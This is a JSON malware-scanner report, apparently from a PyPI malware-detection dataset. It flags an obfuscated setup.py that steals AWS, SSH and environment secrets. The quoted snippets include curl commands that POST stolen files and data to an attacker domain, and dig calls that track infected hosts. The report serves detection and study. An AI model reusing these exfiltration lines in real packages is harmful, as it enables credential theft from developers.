{
  "package_name": "56188314c3770346e7c6581d8de8e21a84126122",
  "total_matches": 13,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
      "file_name": "setup.py",
      "detection_count": 13,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is highly malicious. It collects sensitive information from the host system, including AWS IAM credentials (via the EC2 metadata service), AWS CLI credentials, environment variables, SSH keys, .env files, hostname, username, current working directory, and network interface information. It then exfiltrates this data to remote servers (http://graphs.pygrata.com/uploader.php and http://graphs.pygrata.com/api.php) using HTTP POST requests via curl. The code also attempts to signal or track infected users via DNS queries to a domain controlled by the attacker. The use of subprocess.getoutput to execute shell commands, the collection of credentials and secrets, and the exfiltration of this data to an external server are all clear indicators of malicious intent.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "27",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "VWTHEshkNraxJyWodVblYaRWrQoyNaCJ = subprocess.getoutput(DeGVpFFywbvXkprzsZMvlcYhEKkQgxmU)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:27",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "32",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "WKLNXAISLQBatKtXxcaTEHdQITwNzbHf = subprocess.getoutput(SNmJsZUfFnXEMsHadPlOfhfydHDCgIyB)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:32",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "38",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "RKbaJFKGrYnBhgvHKEfwQBmSDnPPxzXn = subprocess.getoutput(WliHgjpqEgaVyMQyltmdviqfvmWwmMFM)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:38",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "61",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "GRqxRZLaEFHquLJfEiazVFiXWPSyGRaz = subprocess.getoutput(DJgVZwyNfSmtKRZgqnCsarYBBWtZbHIT)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:61",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "72",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "xpRrcvlqAXlfqcBvEAoEebBhEBEXFyVO = subprocess.getoutput(lAHbcGTOMBBVHxhBgRLSfLacRqDRUxMm)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:72",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "78",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "jEHxXBDfnwOJpdVfyMjJkGFLFJfGtMlc = subprocess.getoutput(XXMqwrLHhSHCArROSboncdoqosaBzghl)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:78",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "86",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "JAMFCFIOgCSsqUufQNwvGcKmijsLuHbr = subprocess.getoutput(oOXbnDiiFcikUblLiZljhNSJbMVEcOwe)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:86",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "94",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\n\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\"\n+ JiQIIJfURyPiEvePHKeQNkRuZvAinmrd + \"' -F 'submit=Upload'\")",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:94",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "97",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\n'curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' +\naBuTjbqMUtazSSwmJntKAjGXqrxVJkcG + '\"')",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:97",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "105",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('dig ' + jXNECeqIUXxFTYBPKJbKWlCmPzgLVpUL + 'isuser.api.pygrata.com')",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:105",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "111",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\n\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\"\n+ JiQIIJfURyPiEvePHKeQNkRuZvAinmrd + \"' -F 'submit=Upload'\")",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:111",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "114",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput(\n'curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' +\nWFVjwHYyxQlERMQySYTTxDIgYqMKHMKK + '\"')",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:114",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "122",
          "type_description": "code-execution: found 13 source code matches",
          "code_snippet": "subprocess.getoutput('dig ' + jXNECeqIUXxFTYBPKJbKWlCmPzgLVpUL + 'isuser.api.pygrata.com')",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:122",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/56188314c3770346e7c6581d8de8e21a84126122/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}